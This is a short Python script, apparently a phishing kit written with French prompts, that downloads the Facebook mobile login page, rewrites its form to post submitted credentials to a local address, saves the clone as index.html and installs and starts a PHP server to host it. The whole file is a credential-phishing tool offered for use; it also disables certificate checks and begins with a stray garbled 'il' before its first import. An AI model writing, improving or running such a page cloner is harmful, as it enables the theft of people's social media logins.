ilimport requests
from bs4 import BeautifulSoup
import urllib3
import os 
from rich.console import Console

console = Console()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#author : Jhonson

site=['https://m.facebook.com/login/?locale=fr_FR']
decor = '[bold yellow]'
console.print(f'\n\n{decor}'+'[0]'+str('FACEBOOK')+'\n\n')

try :
	
		url=int(console.input('[bold blue]Veuillez entrer ou saisir un chiffre correspondant a votre site phishing que vous voulez voir :'))
		r =requests.get(f'{site[url]}', verify=False)
		soup = BeautifulSoup(r.text, 'html.parser')
		modif = soup.select_one('form[action]')
		if modif :
		  modif['action']='http://0.0.0.0:8000'
		  change = str(soup.prettify())
		  file =open('index.html','w')
		  file.write(change)
		  def php_server():
		  	os.system('apt install php')
		  	os.system('php -S 0.0.0.0:3000')
		  php_server()	
except :
	console.print ('[bold red] Entre uniquement un chiffre !')
